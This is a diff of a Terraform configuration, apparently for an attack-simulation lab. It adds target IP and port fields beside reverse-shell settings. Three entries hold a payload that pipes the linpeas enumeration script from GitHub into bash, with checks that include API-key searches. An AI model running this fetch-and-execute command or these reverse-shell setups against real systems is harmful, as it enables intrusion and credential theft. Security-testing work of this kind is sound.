@@ -120,6 +120,8 @@ variable "config" {
                 attack_delay = number
                 payload = string
                 task = string
+                target_ip = string
+                target_port = number
                 reverse_shell_host = string
                 reverse_shell_port = number
               })
@@ -404,6 +406,8 @@ variable "config" {
                 attack_delay = number
                 payload = string
                 task = string
+                target_ip = string
+                target_port = number
                 reverse_shell_host = string
                 reverse_shell_port = number
               })
@@ -688,6 +692,8 @@ variable "config" {
                 attack_delay = number
                 payload = string
                 task = string
+                target_ip = string
+                target_port = number
                 reverse_shell_host = string
                 reverse_shell_port = number
               })
@@ -981,6 +987,8 @@ variable "config" {
                 attack_delay = 50400
                 payload = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
                 task = "custom"
+                target_ip = null
+                target_port = 22
                 reverse_shell_host = null
                 reverse_shell_port = 4444
               }
@@ -1265,6 +1273,8 @@ variable "config" {
                 attack_delay = 50400
                 payload = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
                 task = "custom"
+                target_ip = null
+                target_port = 22
                 reverse_shell_host = null
                 reverse_shell_port = 4444
               }
@@ -1569,6 +1579,8 @@ variable "config" {
                 attack_delay = 50400
                 payload = "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
                 task = "custom"
+                target_ip = null
+                target_port = 22
                 reverse_shell_host = null
                 reverse_shell_port = 4444
               }
